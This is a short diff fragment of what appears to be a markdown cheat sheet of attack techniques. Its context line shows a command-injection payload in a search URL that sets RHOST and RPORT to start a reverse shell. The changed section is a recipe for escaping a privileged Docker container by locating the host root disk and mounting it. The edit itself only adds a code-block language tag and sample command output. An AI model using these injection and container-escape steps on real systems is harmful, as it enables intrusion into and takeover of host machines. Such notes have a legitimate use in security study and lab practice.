@@ -21,10 +21,11 @@ localhost:5000/search?q=<something>||export RHOST="<IP>";export RPORT=<PORT>;pyt
 ```
 
 # Mounting rootFS in privilege container
-```
+``` bash
 cat /proc/cmdline
+> BOOT_IMAGE=/boot/vmlinuz-5.19.0-40-generic root=UUID=b4622f81-d047-4c8b-86ea-a7dcfb3dd58f ro quiet splash
 findfs UUID=b4622f81-d047-4c8b-86ea-a7dcfb3dd58f
->/dev/sda3
+> /dev/sda3
 mkdir /mnt-test && mount /dev/sda3 /mnt-test
 cd /mnt-test/var/lib/docker
 
